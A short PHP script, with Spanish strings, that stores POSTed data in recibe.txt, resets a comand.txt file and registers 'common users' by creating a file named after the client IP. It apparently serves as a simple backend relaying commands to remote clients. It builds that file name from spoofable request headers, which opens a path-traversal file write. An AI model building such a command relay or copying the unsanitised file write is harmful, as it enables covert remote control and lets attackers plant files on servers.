<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


if (isset($_POST["data"])){
    $data = $_POST["data"];
    if ($data == "listo"){
        echo "hola";
        echo "alert puesta";
        $fil = fopen("comand.txt", "w+");
        fwrite($fil, "");
        fclose($fil);
    }
    else{
        echo "guardando datos";
        $file = fopen("recibe.txt", "w+");
        fwrite($file, "$data");
        fclose($file);
        
        
        $fil = fopen("comand.txt", "w+");
        fwrite($fil, "");
        fclose($fil);
    }
    
}
#usuarios comunes
if (isset($_POST["usuariocomun"])){
    $usuariocomun = $_POST["usuariocomun"];
    $name = $ip . ".txt";
    $file = fopen($name, "w+");
    fwrite($file, "");
    fclose($file);
}